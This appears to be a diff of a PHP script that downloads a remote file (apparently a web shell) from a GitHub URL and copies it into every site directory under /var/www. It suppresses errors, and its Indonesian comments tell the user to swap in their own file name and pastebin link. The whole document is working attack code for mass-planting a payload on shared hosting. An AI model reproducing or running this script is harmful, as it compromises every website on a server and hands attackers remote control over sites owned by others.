@@ -1,11 +1,11 @@
 <?php
 error_reporting(0);
 
-$root = '/var/www/vhosts';
+$root = '/var/www';
 $scan = scandir($root);
 
-$nama = 'kntl.php'; 
-$isi = file_get_contents('https://raw.githubusercontent.com/Sniperxxx/sniper404/main/Billy.php'); 
+$nama = 'kntl.php'; // ganti nama file
+$isi = file_get_contents('https://raw.githubusercontent.com/Sniperxxx/sniper404/main/Billy.php'); // ganti link pastebin scriptmu
 
 $bikin = fopen($nama, "w");
 		 fwrite($bikin, $isi);
@@ -13,7 +13,7 @@ $bikin = fopen($nama, "w");
 
 foreach ( $scan as $a ) {
 	$dir = "$a \n";
-	$gas = $root.'/'.$a.'/'.$nama;
+	$gas = $root.'/'.$a.'/web/'.$nama;
 	$cos = "$gas \n";
 	$asu = @copy($nama, $gas);
 	if($asu) {
